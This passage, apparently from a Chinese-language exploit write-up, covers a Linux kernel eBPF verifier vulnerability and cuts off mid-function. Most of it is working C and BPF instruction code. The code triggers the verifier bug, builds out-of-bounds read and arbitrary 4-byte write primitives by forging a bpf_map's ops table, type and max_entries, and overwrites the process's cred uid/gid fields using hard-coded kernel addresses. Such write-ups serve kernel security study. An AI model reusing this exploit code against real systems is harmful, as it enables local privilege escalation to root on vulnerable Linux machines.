<span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">bpf_map_update_value</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map *</span><span style="color:#bf616a;">map</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> fd </span><span style="color:#bf616a;">f</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">key</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">				</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">, __u64 </span><span style="color:#bf616a;">flags</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">	} </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(map-&gt;map_type == BPF_MAP_TYPE_QUEUE ||
</span><span style="color:#c0c5ce;">		   map-&gt;map_type == BPF_MAP_TYPE_STACK) {
</span><span style="color:#c0c5ce;">		err = map-&gt;ops-&gt;</span><span style="color:#8fa1b3;">map_push_elem</span><span style="color:#c0c5ce;">(map, value, flags);
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	...
</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
</span></pre>
<p>另外前面调用过程还有检查，map中spin_lock_off要&gt;=0</p>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* flags for BPF_MAP_UPDATE_ELEM command */
</span><span style="color:#b48ead;">enum </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	BPF_ANY		= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#65737e;">/* create new element or update existing */
</span><span style="color:#c0c5ce;">	BPF_NOEXIST	= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#65737e;">/* create new element if it didn&#39;t exist */
</span><span style="color:#c0c5ce;">	BPF_EXIST	= </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#65737e;">/* update existing element */
</span><span style="color:#c0c5ce;">	BPF_F_LOCK	= </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">, </span><span style="color:#65737e;">/* spin_lock-ed map_lookup/map_update */
</span><span style="color:#c0c5ce;">};
</span><span style="color:#b48ead;">static inline bool </span><span style="color:#8fa1b3;">map_value_has_spin_lock</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> bpf_map *</span><span style="color:#bf616a;">map</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> map-&gt;spin_lock_off &gt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#b48ead;">static int </span><span style="color:#8fa1b3;">map_update_elem</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">union</span><span style="color:#c0c5ce;"> bpf_attr *</span><span style="color:#bf616a;">attr</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((attr-&gt;flags &amp; BPF_F_LOCK) &amp;&amp;
</span><span style="color:#c0c5ce;">	    !</span><span style="color:#8fa1b3;">map_value_has_spin_lock</span><span style="color:#c0c5ce;">(map)) {
</span><span style="color:#c0c5ce;">		err = -EINVAL;
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> err_put;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	err = </span><span style="color:#8fa1b3;">bpf_map_update_value</span><span style="color:#c0c5ce;">(map, f, key, value, attr-&gt;flags);
</span><span style="color:#c0c5ce;">	...
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>最终组合拳：
在 <code>bpf_array.value</code> 上构造一个 fake ops 将 <code>ops-&gt;map_push_elem</code> 替换为 <code>array_map_get_next_key()</code> ，之后替换掉 map 的函数表，并更改 <code>map.max_entries</code> 为 <code>0xffffffff</code> 、更改 map 类型为 <code>BPF_MAP_TYPE_STACK</code> 、更改 <code>map.spin_lock_off</code> 为正数来实现任意地址写，需要注意的是单次只能写 4 字节</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">MAKE_ARBITRARY_WRITE_OPS</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">)          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* extend the alu_limit */                      </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_7), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_8, VULN_REG),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_7, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, BPF_REG_8, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, BPF_REG_8),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_8, VULN_REG),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* overwrite spin_lock_off */                   </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(VULN_REG, BPF_REG_8),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, VULN_REG, </span><span style="color:#d08770;">0xE4</span><span style="color:#c0c5ce;">),         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_5, </span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">),               \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_W, BPF_REG_7, BPF_REG_5, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* overwrite max_entries */                     </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(VULN_REG, BPF_REG_8),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, VULN_REG, </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_5, </span><span style="color:#d08770;">0xffffffff</span><span style="color:#c0c5ce;">),           \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_W, BPF_REG_7, BPF_REG_5, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* overwrite map type */                        </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(VULN_REG, BPF_REG_8),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, VULN_REG, </span><span style="color:#d08770;">0xC</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_5, </span><span style="color:#d08770;">23</span><span style="color:#c0c5ce;">),                   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_W, BPF_REG_7, BPF_REG_5, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* overwrite the map-&gt;ops */                    </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(VULN_REG, BPF_REG_8),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, VULN_REG, </span><span style="color:#d08770;">0x18</span><span style="color:#c0c5ce;">),         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_4), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LDX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_5, BPF_REG_4, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_7, BPF_REG_5, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">size_t fake_ops_addr;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">make_arbitrary_write_ops</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_insn prog[] = {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">TRIGGER_VULN</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">MAKE_VULN_REG</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">MAKE_ARBITRARY_WRITE_OPS</span><span style="color:#c0c5ce;">(map_fd),
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">    };
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> key;
</span><span style="color:#c0c5ce;">    size_t per_ops_ptr, value[</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">], value_idx;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map_ops *ops_data;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* save fake ops addr into map */
</span><span style="color:#c0c5ce;">    fake_ops_addr = map_addr + </span><span style="color:#d08770;">0x110 </span><span style="color:#c0c5ce;">+ MAP_SIZE;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* read ops */
</span><span style="color:#c0c5ce;">    value_idx = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(size_t i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; sizeof(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map_ops); i += </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        per_ops_ptr = </span><span style="color:#8fa1b3;">read_arbitrary_addr</span><span style="color:#c0c5ce;">(map_fd, map_ops_addr + i);
</span><span style="color:#c0c5ce;">        value[value_idx++] = per_ops_ptr;
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* load ops */
</span><span style="color:#c0c5ce;">    ops_data = (</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> bpf_map_ops *) value;
</span><span style="color:#c0c5ce;">    ops_data-&gt;map_push_elem = (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*) (ARRAY_MAP_GET_NEXT_KEY + kernel_offset);
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to look up value!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* we&#39;ll take fake ops&#39;s addr from map */
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = fake_ops_addr;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">err_exit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">FAILED to look up value!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* hijack the map */
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">run_bpf_prog</span><span style="color:#c0c5ce;">(prog, sizeof(prog) / sizeof(prog[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]), </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">arbitrary_write_4_bytes_by_map</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">addr</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">val</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    size_t value[</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> key;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    key = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = val - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">bpf_map_update_elem</span><span style="color:#c0c5ce;">(map_fd, &amp;key, &amp;value[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], addr);
</span><span style="color:#c0c5ce;">}
</span></pre>
<h3 id="exp">exp</h3><p><code>array_map_get_next_key()</code> 中会要求 <code>index != max_entries - 1</code> ，而 <code>init_cred</code> 的高 32 位必定是 <code>0xFFFFFFFF</code> ，因此这里直接改写当前进程的 <code>task_struct.cred</code> 的 uid 与 gid 相关字段：</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">_GNU_SOURCE
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sched.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/prctl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">kernelpwn.h</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">bpf_tools.h</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ARRAY_MAP_OPS   </span><span style="color:#d08770;">0xffffffff822363e0
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">ARRAY_MAP_GET_NEXT_KEY </span><span style="color:#d08770;">0xffffffff81239c80
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">INIT_TASK       </span><span style="color:#d08770;">0xffffffff82e1b400
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">INIT_CRED       </span><span style="color:#d08770;">0xffffffff82e88f20
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">MAP_SIZE </span><span style="color:#d08770;">0x2000
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">VULN_REG    BPF_REG_6
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">TRIGGER_VULN</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">)                          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* load value into r2, make it part-unknown */  </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_8), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LDX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, VULN_REG, BPF_REG_8, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_4, </span><span style="color:#d08770;">0xffffffff</span><span style="color:#c0c5ce;">),           \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_LSH, BPF_REG_4, </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_AND, VULN_REG, BPF_REG_4),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, VULN_REG, </span><span style="color:#d08770;">0x1</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* r3 = 0x100000002 */                          </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_3, </span><span style="color:#d08770;">0x1</span><span style="color:#c0c5ce;">),                  \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_LSH, BPF_REG_3, </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_3, </span><span style="color:#d08770;">0x2</span><span style="color:#c0c5ce;">),         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* triger the vulnerability */                  </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_AND, VULN_REG, BPF_REG_3)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">MAKE_VULN_REG</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">)                         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* load value into r3, make it [0, 1] under 32 bit */                </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_8), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LDX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_7, BPF_REG_8, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_JMP32_IMM</span><span style="color:#c0c5ce;">(BPF_JLE, BPF_REG_7, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">),        \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_0, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),                    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_EXIT_INSN</span><span style="color:#c0c5ce;">(),                                \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_ADD, VULN_REG, BPF_REG_7),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, VULN_REG, </span><span style="color:#d08770;">0x1</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_AND, VULN_REG, </span><span style="color:#d08770;">0x1</span><span style="color:#c0c5ce;">),          \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_IMM</span><span style="color:#c0c5ce;">(BPF_REG_0, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#define </span><span style="color:#8fa1b3;">READ_ARBITRARY_ADDR</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">__map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">__idx</span><span style="color:#c0c5ce;">)            \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* extend the alu-&gt;limit and do the oob read */ </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, __map_fd, BPF_REG_7), \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_MOV64_REG</span><span style="color:#c0c5ce;">(BPF_REG_8, VULN_REG),             \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_ADD, BPF_REG_7, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, BPF_REG_8, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">),      \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, BPF_REG_8),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_MUL, VULN_REG, </span><span style="color:#d08770;">0xd0</span><span style="color:#c0c5ce;">),         \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_REG</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_7, VULN_REG),    \
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">/* write the value into bpf_map-&gt;btf */         </span><span style="color:#c0c5ce;">\
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_READ_ARRAY_MAP_IDX</span><span style="color:#c0c5ce;">(__idx, __map_fd, BPF_REG_8),     \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_LDX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_1, BPF_REG_8, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">),   \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_ALU64_IMM</span><span style="color:#c0c5ce;">(BPF_SUB, BPF_REG_1, </span><span style="color:#d08770;">0x58</span><span style="color:#c0c5ce;">),        \
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">BPF_STX_MEM</span><span style="color:#c0c5ce;">(BPF_DW, BPF_REG_7, BPF_REG_1, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static </span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">read_arbitrary_addr_4_bytes</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">map_fd</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">)
